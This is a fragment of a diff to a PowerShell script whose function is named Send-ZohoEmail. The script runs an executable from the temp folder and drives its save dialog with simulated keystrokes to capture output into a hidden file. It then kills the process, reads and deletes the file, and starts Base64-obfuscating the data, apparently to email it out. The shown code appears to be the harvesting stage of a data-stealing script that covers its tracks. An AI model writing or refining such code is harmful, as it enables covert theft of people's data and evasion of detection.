@@ -116,7 +116,7 @@ function Send-ZohoEmail {
         $process = Start-Process $tempExePath # Start the executable
 
         #  SAVED DATA 
-        $tempFile = "$env:TEMP\data.txt"
+        $outputFilePath = "$env:TEMP\data.txt"
         Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
         Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys
 
@@ -127,16 +127,17 @@ function Send-ZohoEmail {
         Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear
 
         # Send the output file path and Enter
-        [System.Windows.Forms.SendKeys]::SendWait("$tempFile")
+        [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
         Start-Sleep -Milliseconds 500  # Wait for the input
         [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
 
         Start-Sleep -Seconds 2 # Wait a moment for the file to save
         Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
-if (Test-Path $tempFile) {
-    $rawData = Get-Content $tempFile | Out-String
-    Remove-Item $tempFile -Force
+if (Test-Path $outputFilePath) {
+    $rawData = Get-Content $outputFilePath | Out-String
+    Start-Sleep -Seconds 2
+    Remove-Item $outputFilePath -Force
 }
 
 # 4. Obfuscate the data using Base64
